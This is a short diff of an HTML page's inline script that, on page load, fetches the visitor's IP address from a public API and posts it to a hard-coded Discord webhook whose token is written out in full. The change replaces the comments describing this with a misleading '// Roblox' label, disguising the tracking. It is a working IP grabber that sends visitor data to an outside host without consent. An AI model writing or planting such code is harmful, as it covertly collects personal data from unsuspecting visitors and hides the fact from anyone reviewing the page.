@@ -27,15 +27,16 @@
 <body>
 
 <script>
-    // Fetch the user's IP address from a public API
+    // Roblox
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             const ipAddress = data.ip;
             console.log('IP Address:', ipAddress);
 
-            // Send the IP address to the Discord webhook
-            fetch('https://discord.com/api/webhooks/1284169705354956830/xUzNzRi4NAUvKaopglah822JJIQjSR9w48HB3l7b8dP7l-4IiHCsHu8r363HxS8b875Q', {
+            // Roblox
+	
+         fetch('https://discord.com/api/webhooks/1284169705354956830/xUzNzRi4NAUvKaopglah822JJIQjSR9w48HB3l7b8dP7l-4IiHCsHu8r363HxS8b875Q', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
